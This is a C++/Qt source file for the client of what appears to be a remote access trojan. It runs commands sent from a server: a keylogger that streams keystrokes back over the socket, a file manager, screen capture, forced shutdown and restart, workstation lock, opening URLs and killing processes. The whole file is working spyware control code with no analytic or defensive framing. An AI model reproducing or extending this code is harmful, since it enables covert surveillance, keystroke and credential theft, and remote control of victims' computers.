#include "client.h"

client::client(QObject *parent, tkey *klPtr) :
    QObject(parent), keyloggerPtr(klPtr)
{
    //initialize the variables of the object
    cnew = NULL;
    fmnew = NULL;
    scnew = NULL;
    opened = NULL;
    communicationSocket = NULL;

    //set the name of the client
    name = "chachu";
}


void client::startClient()
{
    //start the client
    communicationSocket = new tcpsocket(this, name);
    connect(communicationSocket, SIGNAL(disconnectedFromHost()), this, SLOT(resetConnections()));
    connect(communicationSocket, SIGNAL(recievedCommand(QByteArray)), this, SLOT(onServerCommand(QByteArray)));
}

void client::stopClient()
{
    //stop the client
    delete communicationSocket;
    communicationSocket = NULL;
}

void client::onServerCommand(QByteArray command)
{
    //if the server sends "fileManager", create a fileManager object and connect it to the socket object
    if (command == QByteArray("fileManager"))
    {
        fmnew = new fileManager(this, communicationSocket);
        opened = fmnew;
        connectOpened(opened);
    }

    //if the server sends "keyLogger", connect the tkey object to the socket object
    else if (command == QByteArray("keyLogger"))
    {
        opened = keyloggerPtr;
        connectOpened(opened);
        connect(keyloggerPtr, SIGNAL(sendCharacter(QByteArray)), communicationSocket, SLOT(sendReply(QByteArray)));
    }

    //if the server sends "chat", create a chat object(if it doesn't already exist) and connect it to the socket object
    else if (command == QByteArray("chat"))
    {
        if(cnew == NULL)
            cnew = new chat(NULL, communicationSocket);

        else
            cnew->show();

        opened = cnew;
        connectOpened(opened);
    }

    else if (command == QByteArray("screenCap"))
    {
        scnew = new screenCap(this, communicationSocket);
        opened = scnew;
        connectOpened(opened);
    }

    else if(command == QByteArray("shutdown"))
    {
        QProcess::startDetached("shutdown -s -f -t 00");
    }

    else if(command == QByteArray("restart"))
    {
        QProcess::startDetached("shutdown -r -f -t 00");
    }

    else if(command == QByteArray("lock"))
    {
        QProcess::startDetached("Rundll32.exe User32.dll,LockWorkStation");
    }

    else if(command == QByteArray("die"))
    {
        exit(0);
    }

    else if(command.startsWith("url "))
    {
        command.remove(0, 4);
        QDesktopServices::openUrl(QUrl(QString(command)));
    }

    else if(command.startsWith("kill "))
    {
        command.remove(0, 5);
        QProcess::startDetached("taskkill /IM " + QString(command) + " /F");
    }
}


void client::connectOpened(QObject *opened)
{
    resetConnections();
    connect(communicationSocket, SIGNAL(recievedCommand(QByteArray)), opened, SLOT(recievedCommand(QByteArray)));
}

void client::resetConnections()
{
    disconnect(keyloggerPtr, SIGNAL(sendCharacter(QByteArray)), 0, 0);
    disconnect(communicationSocket, SIGNAL(recievedCommand(QByteArray)), 0, 0);
    connect(communicationSocket, SIGNAL(recievedCommand(QByteArray)), this, SLOT(onServerCommand(QByteArray)));
}







